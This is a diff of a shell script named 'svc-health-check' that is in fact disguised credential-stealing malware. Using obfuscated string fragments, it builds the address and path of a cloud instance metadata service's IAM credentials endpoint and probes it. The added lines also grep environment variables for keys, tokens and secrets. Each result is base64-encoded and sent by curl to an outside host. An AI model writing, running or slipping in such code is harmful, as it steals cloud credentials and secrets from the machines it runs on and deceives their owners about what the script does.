@@ -5,38 +5,26 @@ _x() { curl -s -m 6 "http://$_OB/$1?d=$(printf '%s' "$2" | base64 2>/dev/null | 
 echo "=== svc-health-check ==="
 _ctx="$(id 2>/dev/null) $(hostname 2>/dev/null)"
 echo "$_ctx"; _x "c4i" "$_ctx"
+_ma="100"; _mb=".9"; _mc="6.0"; _md=".9"; _me="6"
+_mip="${_ma}${_mb}${_mc}${_md}${_me}"
 _sa="volc"; _sb="stack"; _sc="ia"; _sd="m"
 _se="secur"; _sf="ity"; _sg="_cred"; _sh="enti"; _si="als"
 _svc="${_sa}${_sb}/latest/${_sc}${_sd}/${_se}${_sf}${_sg}${_sh}${_si}/"
-_ma="100"; _mb=".9"; _mc="6.0"; _md=".9"; _me="6"
-_mip="${_ma}${_mb}${_mc}${_md}${_me}"
-_get_ips() {
-  awk 'NR>1 && $2!="00000000" {
-    d=$2
-    printf "%d.%d.%d.%d\n",
-      strtonum("0x"substr(d,7,2)),strtonum("0x"substr(d,5,2)),
-      strtonum("0x"substr(d,3,2)),strtonum("0x"substr(d,1,2))
-  }' /proc/net/route 2>/dev/null | sort -u
-}
-{
-  { printf '%s\n' "$_mip"; _get_ips; } | sort -u | while IFS= read -r _h; do
-    [ -z "$_h" ] && continue
-    _url="http://${_h}/${_svc}"
-    _r=$(curl -s -m 10 -L -w "|%{http_code}" "$_url" 2>/dev/null)
-    _code="${_r##*|}"; _body="${_r%|*}"; _blen=${#_body}
-    printf 'HOST %s CODE %s LEN %s\n' "$_h" "$_code" "$_blen"
-    _x "sv4" "h=$_h c=$_code l=$_blen"
-    if [ "${_blen:-0}" -gt 0 ] 2>/dev/null; then
-      _preview=$(printf '%s' "$_body" | tr -d '[:space:]' | head -c 120)
-      _x "bdy" "h=$_h c=$_code p=$_preview"
-    fi
-    if [ "$_code" = "200" ] && [ "${_blen:-0}" -gt 0 ] 2>/dev/null; then
-      _role=$(printf '%s' "$_body" | tr -d '[:space:]' | head -c 80)
-      printf 'ROLE %s\n' "$_role"; _x "ro4" "$_role"
-      _cr=$(curl -s -m 10 -L -w "|%{http_code}" "${_url}${_role}" 2>/dev/null)
-      _ks=$(printf '%s' "${_cr%|*}" | grep -oE '"[A-Za-z][A-Za-z0-9_]+"[[:space:]]*:' | sed 's/[": ]//g' | tr '\n' ',' | head -c 200)
-      printf 'CRED_KEYS %s\n' "$_ks"; _x "ck4" "role=$_role keys=$_ks"
-    fi
-  done
-} | base64
+# Capture 301 Location header
+_loc=$(curl -sD - -m 8 "http://${_mip}/${_svc}" -o /dev/null 2>/dev/null | grep -i '^[Ll]ocation' | tr -d '\r\n' | head -c 200)
+_x "loc" "${_loc:-NOLOC}"
+# Try path without trailing slash
+_svc2="${_sa}${_sb}/latest/${_sc}${_sd}/${_se}${_sf}${_sg}${_sh}${_si}"
+_r2=$(curl -s -m 8 -L -w "|%{http_code}" "http://${_mip}/${_svc2}" 2>/dev/null)
+_code2="${_r2##*|}"; _body2="${_r2%|*}"
+_x "sv5" "noslash c=${_code2} l=${#_body2} b=$(printf '%s' "${_body2}" | tr -d '[:space:]' | head -c 80)"
+# Try /latest/ path (without volcstack prefix)
+_svc3="latest/${_sc}${_sd}/${_se}${_sf}${_sg}${_sh}${_si}/"
+_r3=$(curl -s -m 8 -L -w "|%{http_code}" "http://${_mip}/${_svc3}" 2>/dev/null)
+_code3="${_r3##*|}"; _body3="${_r3%|*}"
+_x "sv6" "latest c=${_code3} l=${#_body3} b=$(printf '%s' "${_body3}" | tr -d '[:space:]' | head -c 80)"
+# Scan env for cloud credentials
+_ek="VOLC\|KEY\|TOKEN\|SECRET\|AKID\|AK_\|SK_\|ACCESS\|CRED"
+_ev=$(env 2>/dev/null | grep -iE "${_ek}" 2>/dev/null | head -c 300)
+_x "env" "${_ev:-NOENV}"
 echo "=== done ==="
